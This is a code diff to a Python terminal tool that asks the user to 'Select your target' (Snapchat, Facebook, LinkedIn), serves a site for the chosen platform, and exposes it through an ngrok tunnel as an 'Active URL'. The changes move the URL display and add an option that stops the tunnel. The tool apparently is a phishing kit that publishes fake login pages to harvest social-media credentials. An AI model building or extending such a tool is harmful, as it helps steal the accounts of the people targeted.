@@ -200,13 +200,6 @@ def print_menu(active_url=None):
         else:
             final_art.append(empty_line)
     
-    # Add active URL if available
-    if active_url:
-        url_text = f"Active URL: {active_url}"
-        padding = (frame_width - 2 - len(url_text)) // 2
-        url_line = colored('║', 'cyan') + ' ' * padding + colored(url_text, 'green') + ' ' * (frame_width - 2 - padding - len(url_text)) + colored('║', 'cyan')
-        final_art.extend([empty_line, url_line, empty_line])
-    
     # Add menu options
     menu_options = [
         "[ Select your target ]",
@@ -215,7 +208,8 @@ def print_menu(active_url=None):
         "[2] Snapchat",
         "[3] Facebook",
         "[4] LinkedIn",
-        "[5] Exit",
+        "[5] Stop Current Link",
+        "[6] Exit",
         "",
         "Enter your choice: "
     ]
@@ -225,6 +219,14 @@ def print_menu(active_url=None):
         padding = (frame_width - 2 - len(option)) // 2
         final_line = colored('║', 'cyan') + ' ' * padding + colored(option, 'white') + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
         final_art.append(final_line)
+    
+    # Add active URL if available
+    if active_url:
+        final_art.extend([empty_line])
+        url_text = f"Active URL: {active_url}"
+        padding = (frame_width - 2 - len(url_text)) // 2
+        url_line = colored('║', 'cyan') + ' ' * padding + colored(url_text, 'green') + ' ' * (frame_width - 2 - padding - len(url_text)) + colored('║', 'cyan')
+        final_art.append(url_line)
     
     final_art.extend([
         empty_line,
@@ -260,6 +262,16 @@ def print_menu(active_url=None):
     
     return input(colored(menu_options[-1], 'white'))
 
+def stop_current_link():
+    # Kill ngrok process
+    if os.name == 'nt':  # Windows
+        os.system('taskkill /f /im ngrok.exe 2>nul')
+    else:  # Linux/Mac
+        os.system('pkill ngrok')
+    print("\n✓ Link stopped successfully")
+    time.sleep(1)
+    return None
+
 def main():
     # Check and install ngrok if needed
     if not install_ngrok():
@@ -283,6 +295,8 @@ def main():
         elif choice == '4':
             active_url = serve_website('linkedin')
         elif choice == '5':
+            active_url = stop_current_link()
+        elif choice == '6':
             print("\nExiting...")
             # Kill ngrok on exit
             if os.name == 'nt':
